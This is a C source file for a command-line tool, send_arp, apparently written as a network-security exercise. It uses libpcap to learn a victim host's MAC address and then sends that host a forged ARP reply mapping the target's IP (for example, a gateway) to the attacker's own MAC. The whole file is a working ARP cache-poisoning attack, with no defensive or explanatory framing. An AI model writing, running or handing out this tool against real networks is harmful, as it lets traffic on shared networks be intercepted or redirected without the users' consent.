#include <pcap.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <netinet/in.h>
#include <string.h>
#include "libnet.h"
//#include <arpa/inet.h>
//#include <stdint.h>

#define IP_ADDR_LEN 4
void usage()
{
	printf("usage. send_arp <interface> <sender ip> <target ip>\n");
	printf("sample. send_arp eth0 192.168.10.2 192.168.10.1\n");
}
void arith_ip(unsigned char* myip, char* dev)
{
	struct ifreq ifr;
	int s;

	strncpy(ifr.ifr_name, dev, IFNAMSIZ);

	s = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
	if(ioctl(s, SIOCGIFADDR, &ifr) < 0)
	{
		printf("Error");
	}
	else
	{
		memcpy(myip, ifr.ifr_hwaddr.sa_data+2, 4);
		//inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, myip, sizeof(struct sockaddr));
	}
}
void arith_mac(unsigned char* mymac)
{
	struct ifreq ifr;
	struct ifconf ifc;
	int s;
	char buf[1024];
	int success = 0;

	s = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

	ifc.ifc_len = sizeof(buf);
	ifc.ifc_buf = buf;
	if (ioctl(s, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

	struct ifreq* it = ifc.ifc_req;
	const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

	for (; it != end; ++it) {
        strcpy(ifr.ifr_name, it->ifr_name);
        if (ioctl(s, SIOCGIFFLAGS, &ifr) == 0) {
            if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                if (ioctl(s, SIOCGIFHWADDR, &ifr) == 0) {
			success = 1;
			break;
                }
            }
        }
        else { /* handle error */ }
	}
	if(success == 1)
	{
		memcpy(mymac, ifr.ifr_hwaddr.sa_data, 6);
	}
}

void ip_parse(char* ip, unsigned char* ip_parse)
{
	char* p;
	int i = 0;

	p = strtok(ip, ".");
	ip_parse[i] = atoi(p);

	while(p != NULL)
	{
		i++;
		p = strtok(NULL, ".");
		if(p)
			ip_parse[i] = atoi(p);
	}
	
}

void make_eth_broad(unsigned char* s_mac_address, struct libnet_ethernet_hdr* eth)
{
	for(int i=0; i < ETHER_ADDR_LEN; i++)
	{
		eth->ether_dhost[i] = 0xff;
		eth->ether_shost[i] = s_mac_address[i];
	}
	eth->ether_type = htons(ETHERTYPE_ARP);
}
void make_eth(unsigned char* s_mac_address, unsigned char* d_mac_address, struct libnet_ethernet_hdr* eth)
{
	for(int i=0; i < ETHER_ADDR_LEN; i++)
	{
		eth->ether_dhost[i] = d_mac_address[i];
		eth->ether_shost[i] = s_mac_address[i];
	}
	eth->ether_type = htons(ETHERTYPE_ARP);
}
void make_arp_req(unsigned char* s_mac_address, unsigned char* s_ip_address, unsigned char* d_ip_address, struct libnet_arp_hdr* arp)
{
	arp->ar_hrd = htons(ARPHRD_ETHER);
	arp->ar_pro = htons(ETHERTYPE_IP);
	arp->ar_hln = 0x06;
	arp->ar_pln = 0x04;
	arp->ar_op = htons(ARPOP_REQUEST);
	for(int i=0; i < ETHER_ADDR_LEN; i++)
	{
		arp->s_mac[i] = s_mac_address[i];
		arp->t_mac[i] = 0x00;
	}

	for(int i=0; i< IP_ADDR_LEN; i++)
	{
		arp->s_ip[i] = s_ip_address[i];
		arp->t_ip[i] = d_ip_address[i];
	}
}
void make_arp_res(unsigned char* s_mac_address, unsigned char* d_mac_address, unsigned char* s_ip_address, unsigned char* d_ip_address, struct libnet_arp_hdr* arp)
{
	arp->ar_hrd = htons(ARPHRD_ETHER);
	arp->ar_pro = htons(ETHERTYPE_IP);
	arp->ar_hln = 0x06;
	arp->ar_pln = 0x04;
	arp->ar_op = htons(ARPOP_REPLY);
	for(int i=0; i < ETHER_ADDR_LEN; i++)
	{
		arp->s_mac[i] = s_mac_address[i];
		arp->t_mac[i] = d_mac_address[i];
	}

	for(int i=0; i< IP_ADDR_LEN; i++)
	{
		arp->s_ip[i] = s_ip_address[i];
		arp->t_ip[i] = d_ip_address[i];
	}
}
int main(int argc, char* argv[])
{
	unsigned char myip[4];
	unsigned char mymac[6];
	unsigned char s_mac_address[6];
	unsigned char s_ip_address[4];
	unsigned char d_ip_address[4];

	if(argc != 4)
	{
		usage();
		return -1;
	}

	char* dev = argv[1];
	char* s_ip = argv[2];
	char* t_ip = argv[3];
	char errbuf[PCAP_ERRBUF_SIZE];
	struct pcap_pkthdr* header;
	const u_char* recv_packet;
	struct libnet_ethernet_hdr eth;
	struct libnet_arp_hdr arp;
	u_char packet[sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr)];

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n",dev, errbuf);
	}

	arith_ip(myip, dev);
	arith_mac(mymac);
	make_eth_broad(mymac, &eth);
	memcpy(packet, &eth, sizeof(eth));
	
	ip_parse(s_ip, s_ip_address);
	ip_parse(t_ip, d_ip_address);
	//make_arp_req(s_mac_address, s_ip_address, d_ip_address, &arp);
	make_arp_req(mymac, myip, s_ip_address, &arp);
	memcpy(packet+sizeof(struct libnet_ethernet_hdr), &arp, sizeof(arp));

	if(pcap_sendpacket(handle, packet, sizeof(packet)) != 0)
	{
		printf("%s\n", "error sending the packet");
		return -1;
	}
	pcap_next_ex(handle, &header, &recv_packet);
	for(int i=0; i < ETHER_ADDR_LEN; i++)
	{
		s_mac_address[i] = recv_packet[sizeof(struct libnet_ethernet_hdr) + 8 + i]; // find sender mac
	}
	make_eth(mymac, s_mac_address, &eth);
	memcpy(packet, &eth, sizeof(eth));
	make_arp_res(mymac, s_mac_address, d_ip_address, s_ip_address, &arp);
	memcpy(packet+sizeof(struct libnet_ethernet_hdr), &arp, sizeof(arp));
	if(pcap_sendpacket(handle, packet, sizeof(packet)) != 0)
	{
		printf("%s\n", "error sending the packet");
		return -1;
	}
	return 0;
}

